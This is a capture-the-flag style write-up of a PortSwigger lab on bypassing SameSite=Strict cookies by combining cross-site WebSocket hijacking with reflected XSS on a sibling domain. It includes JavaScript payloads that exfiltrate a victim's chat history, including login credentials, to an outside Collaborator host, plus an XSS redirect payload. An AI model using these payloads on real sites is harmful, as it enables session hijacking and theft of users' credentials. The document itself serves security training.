# CSRF - SameSite Strict bypass via sibling domain

## 📌 Lab Details
- **Title**: SameSite Strict bypass via sibling domain
- **Difficulty**: Practitioner
- **Category**: Cross-site Request Forgery
- **Lab URL**: https://portswigger.net/academy/labs/launch/44cca99334d60d91033bf4bd0908a142896514af0a3c0c343f8017fe71781ae9?referrer=%2fweb-security%2fcsrf%2fbypassing-samesite-restrictions%2flab-samesite-strict-bypass-via-sibling-domain

## 🔍 Summary
This lab demonstrates a **cross-site WebSocket hijacking (CSWSH)** vulnerability, which helps in bypassing the `SameSite=Strict` restriction.

## 🛠 Steps to Solve
1. Go to the live chat feature and send a few messages.
2. Study the **Webscocket** handshake request: `GET /chat`. Observe that this doesn't contains any unpredictable tokens, means might be vulnerable to **CSWSH**.
3. Study the **Websocket** history tab, the browser sends a `READY` message to the server, which causes the server to respond with the entire history.
4. Go to the **Collaborator** tab to copy a collaborator payload.
5. Inject this exploit into the exploit server:
   ```sh
   <script>
    var ws = new WebSocket('wss://YOUR-LAB-ID.web-security-academy.net/chat');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        fetch('https://YOUR-COLLABORATOR-PAYLOAD.oastify.com', {method: 'POST', mode: 'no-cors', body: event.data});
    };
    </script>
    ```
6. On studying the **HTTP** requests, it shows that you have opened up a new connection, even though **CSWSH** vulnerability exists, the reason is the presence of `SameSite=Strict` restriction.
7. Study the **proxy** history to find a sibling domain: `cms-YOUR-LAB-ID.web-security-academy.net`.
8. Try injecting an **XSS** payload into this sibling domain: `<script>alert(1)</script>`.
9. Observe that the alert(1) is called, confirming that this is a viable reflected XSS vector.
10. Recreate the CSWSH script that you tested on the exploit server earlier.
11. URL encode the entire script.
12. Now, induce a `GET` request in the browser by delivering a exploit through the exploit server:
    ```sh
    <script>
    document.location = "https://cms-YOUR-LAB-ID.web-security-academy.net/login?username=YOUR-URL-ENCODED-CSWSH-SCRIPT&password=anything";
    </script>
    ```
13. Deliver the exploit to the victim.
14. Now the `HTTP` history contains all the chat of the user.
15. Extract the **username** and **password** and log in to the lab to complete it.

## 📖 Key Takeaways
- `SameSite=Strict` restriction can be bypassed if the website contains both `CSRF` and `XSS` vulnerability.
-  A **sibling domain (cms-...)** under the same site is considered `"same-site"` by the browser, allowing cookies to be sent.
-  **WebSocket** connections inherit `cookies` when initiated from the same-site sibling domain, enabling hijacking of the chat session.

## 🖼️ Screenshot 
![image](https://github.com/user-attachments/assets/18c9bf5a-c1dc-4883-91ad-811fb4a12c60)
![image](https://github.com/user-attachments/assets/81f3876a-dc06-442b-a079-0702c78a8fd5)
![image](https://github.com/user-attachments/assets/d50e10f5-e357-430d-9e77-335131c061be)
![image](https://github.com/user-attachments/assets/f01ede7e-669d-417d-9669-e2959252c41c)
![image](https://github.com/user-attachments/assets/a25a6083-9182-4ee3-b4c1-d17b9ee63ce8)
![image](https://github.com/user-attachments/assets/1852f2b4-acb4-48a3-82f5-85ed6cf456b5)
![image](https://github.com/user-attachments/assets/5eff66ee-2160-475d-802a-0d881b82ee4a)
![image](https://github.com/user-attachments/assets/2814fc4b-4e2a-4ce2-aba7-d0508bd6ded7)
![image](https://github.com/user-attachments/assets/4464a58d-ee3c-4db5-98e8-a1420f204ac1)
![image](https://github.com/user-attachments/assets/fd5f84f6-85a1-4963-9218-9f0b4b52ed8f)
![image](https://github.com/user-attachments/assets/e0a4263b-ef8d-424a-aaf2-fdcfa5c4d7f3)
![image](https://github.com/user-attachments/assets/e726d9ad-50a0-4187-a7c9-c2dab308d5ee)
![image](https://github.com/user-attachments/assets/fec018a5-4d13-47b4-9573-fcb75668b9c2)
![image](https://github.com/user-attachments/assets/1e7df3b8-d242-4477-b22f-8b51469f9a48)
